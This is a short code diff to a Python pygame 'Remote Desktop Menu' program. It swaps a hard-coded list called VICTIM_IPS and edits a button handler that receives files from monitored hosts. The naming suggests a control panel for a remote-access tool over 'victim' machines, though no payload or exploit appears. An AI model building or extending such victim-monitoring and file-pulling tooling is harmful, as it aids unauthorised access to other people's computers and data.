@@ -33,7 +33,7 @@ pygame.display.set_caption("Remote Desktop Menu")
 font = pygame.font.Font(None, 36)
 
 # Vector victim origin
-VICTIM_IPS = ['10.10.36.107', '192.168.1.6', '192.168.1.2']
+VICTIM_IPS = ['10.20.2.200', '10.20.2.165', '10.10.27.0']
 
 # Thread pool for background tasks
 thread_pool = ThreadPoolExecutor(max_workers=4)
@@ -101,7 +101,7 @@ def status_checker_thread(options):
         for host in options.hosts:
             status = check_single_victim(host, options.port)
             ui_state.victims_status[host] = status
-        pygame.time.delay(2000)  # Check every 2 seconds
+        pygame.time.delay(2000)  
 
 
 def draw_static_frame(surface, frame_rect, border_color=(0, 0, 0), border_width=2):
@@ -154,8 +154,8 @@ def show_full_screen(display, options):
                                 screen_receiver = None
                     elif file_button.rect.collidepoint(event.pos):
                         if file_button.text == "Receive File":
-                            file_button.text = "Receiving..."
-                            thread_pool.submit(lambda: receive_file("0.0.0.0", options.port + 3))
+                            file_button.text = "Received"
+                            thread_pool.submit(lambda: receive_file("0.0.0.0", display.text, options.port + 3))
 
         try:
             screen.fill(WHITE)
